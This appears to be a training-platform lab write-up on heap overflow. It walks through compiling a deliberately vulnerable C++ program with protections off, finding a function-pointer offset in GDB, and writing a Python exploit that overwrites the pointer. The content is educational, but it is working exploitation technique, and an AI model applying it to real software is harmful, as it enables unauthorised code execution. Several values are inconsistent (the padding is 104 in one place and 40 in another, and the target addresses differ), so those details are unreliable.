# CyberLabs: Heap Overflow Vulnerability Laboratory

**Module Code:** CL-MEM-004

**Level:** Intermediate / Advanced

**Topic:** Memory Corruption Vulnerabilities

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses one of the most classic types of memory corruption vulnerabilities: **Heap Overflow**. Participants are expected to gain the following competencies by the end of this laboratory:

  - Understanding the basic mechanism of Heap Overflow vulnerability and its impact on program control flow.
  - Practically observing how adjacent memory blocks affect each other.
  - Performing static and dynamic analysis on a program using tools like `g++`, `objdump`, and `gdb`.
  - Developing a functional exploit (exploitation code) in a controlled laboratory environment to change the program's control flow.

## Heap Overflow

This type of overflow occurs in the heap region where the programmer dynamically allocates memory at runtime using commands like malloc or new.

Unlike stack overflow vulnerabilities, there is no direct return address to overwrite in the heap. Instead, the attacker overflows a heap buffer to corrupt data of another object adjacent to it in memory (such as a function pointer belonging to an object) or metadata used by the memory manager (malloc/free) (such as the size of the memory block, address of the next block, etc.).

Corruption of heap metadata can indirectly provide the ability to write any desired data to any desired location in memory ("arbitrary write"), which can ultimately result in code execution.

## Disclaimer / Legal Warning

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

The information provided in this blog post is for educational and informational purposes only. It does not intend to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities. The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user.

## Scenario

The laboratory scenario consists of two main components:

1.  `heap_overflow.cpp`: Target application written in C++ that intentionally contains a Heap Overflow vulnerability.
2.  `exploit_heap.py`: Python exploitation code that triggers the vulnerability in the vulnerable application, changes the program's flow, and calls a predetermined function.

## Difficulty Levels

## 🟢 **EASY WAY: With Debug Symbols**
```bash
# Add -g flag in test_lab.sh file
g++ -o compiled/zafiyetli_sunucu source_code/zafiyetli_sunucu.cpp -no-pie -g -fno-stack-protector
```
- Easier analysis with debug symbols
- `p &variable` commands work in GDB
- Ideal for educational purposes

## 🔴 **HARD WAY: Without Debug Symbols (Default)**
```bash
# Current compilation (no debug symbols)
g++ -o compiled/zafiyetli_sunucu source_code/zafiyetli_sunucu.cpp -no-pie -fno-stack-protector
```
- Closer to real world
- Requires `info functions`, `disassemble` commands
- Production binaries don't have debug symbols

## Installation and Execution Steps

### Example Code Analysis

Now we need to compile to analyze the vulnerability. We compile our code using
```bash
g++ -o heap_overflow_cpp heap_overflow.cpp -no-pie -g -fno-stack-protector
```
We compile it the same way we explained in the previous topic. Here we disable stack area protection with the "-fno-stack-protector" command.

After our compilation phase is completed, we get a "segmentation fault" error when we input a value above the limit to test the vulnerability. We start our investigation with GDB on this error.

After this stage, we start examining the code by disassembling the main function using the "disassemble main" command.

After viewing the codes, we need to create a payload for the heap area we calculated earlier. At this stage, we can create the value with a Python script like this.

```python
import struct
PADDING_SIZE = 100 # Temporary value
TARGET_ADDRESS = 0x401176 # Calculated Heap Value
payload = b'A' * PADDING_SIZE + struct.pack("<Q", TARGET_ADDRESS)
with open("payload.bin", "wb") as f: f.write(payload)
print("'payload.bin' created.")
```

Then we return to GDB and write "break 22". This way the code will stop at line 22.

We slowly increase the PADDING_SIZE value and start testing with the "run < payload.bin" command on GDB.

At this stage, we see that we are about to pass the if loop. Now, to see if our values have been formed, we first run the "print ses" command to find the location of the value. We note the value that comes out here.

Now we are at the most important stage. We run the command in the form "x/16gx VALUE". The meaning of this command is to **"examine memory (x), show 16 units of value (/16), show in giant word format (each 8 bits, g) and show in hex (x)"**.

**BINGO!** We have successfully detected the vulnerability. Now we move on to calculation. According to these values, our starting variable is **0x4052a0**. **If you look carefully at line 0x405300, you can see the value 0x00401176.** When we examine this value,

  - 0x405300 -> 41
  - 0x405301 -> 41
  - 0x405302 -> 41
  - 0x405303 -> 41
  - 0x405304 -> 76
  - 0x405305 -> 11
  - 0x405306 -> 40
  - 0x405307 -> 00

So actually the **0x405304 (large value)** value is **0x4052a0** when we subtract the values from each other, we get the hex value **0x000064**. When we calculate, **6*16+4*1=100** means that **the islemYapPtr function pointer starts exactly 100 bytes after the beginning of the kullaniciVerisi buffer area.** However, since 100 does not divide 8 exactly, the next closest value, 104, should be our PADDING_SIZE value.

Now we start writing our exploitation code with all this information. I use Python language for the exploitation code. You can write in different languages.

Let's determine our static variables:

```python
# Name of the vulnerable program
VICTIM_PROGRAM = "./zafiyetli_sunucu"

# Static address we found with objdump.
HARDCODED_ADDRESS = 0x401166
# Our padding size
PADDING_SIZE = 104
```

Then we write the code that starts the program:

```python
 try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu -no-pie ile derlediniz mi?")
        sys.exit(1)
```

Now we write the stage that prepares our payloads:

```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
payload = padding + overwrite_address
print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
print("[*] Payload kurban programa gonderiliyor...")
```

Then we write the stage where we check the outputs of the function we injected:

```python
 stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurbandan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    print("--- Exploit Tamamlandi ---")
    
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")
```

And when we run our exploitation code, we see that we have successfully injected the function.

### Complete Exploitation Code

```python
import struct
import subprocess
import sys

VICTIM_PROGRAM = "./zafiyetli_sunucu"
PADDING_SIZE = 40
TARGET_ADDRESS = 0x401166

def main():
    print("--- [ATTACKER] Direct Heap Overflow Exploit Started ---")
    
    print(f"[*] Target Address: {hex(TARGET_ADDRESS)}")
    print(f"[*] Padding Size: {PADDING_SIZE}")
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
    payload = padding + overwrite_address
    print(f"[*] Payload created as {len(payload)} bytes.")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] ERROR: '{VICTIM_PROGRAM}' not found.")
        sys.exit(1)
        
    print("[*] Sending payload to victim program...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Output from Victim Program ---")
    print(stdout_output)
    print("--- Error Output from Victim (if any) ---")
    print(stderr_output)
    
    if "CONTROL TAKEN" in stdout_output:
        print("\n[+] Vulnerability successfully exploited!")
    else:
        print("\n[-] Exploitation failed.")

if __name__ == "__main__":
    main()
```

The important part to pay attention to in the complete code is,
```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
payload = padding + overwrite_address
```
So we create the payload here and actually the whole thing ends here. After writing our exploitation code, we should get a message like this.

## Linux Compatibility

This lab is designed to work on both Linux and macOS systems:

### Compilation for Linux
```bash
# Special compilation script for Linux
./compile_linux.sh

# Or manual compilation
g++ -o compiled/zafiyetli_sunucu source_code/zafiyetli_sunucu.cpp -no-pie -g -fno-stack-protector
```

### Requirements
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Testing
```bash
# Run all tests
./test_lab.sh

# Run exploit
python3 source_code/exploit.py
```

The exploit automatically detects system architecture (32-bit/64-bit) and uses the appropriate packing function.
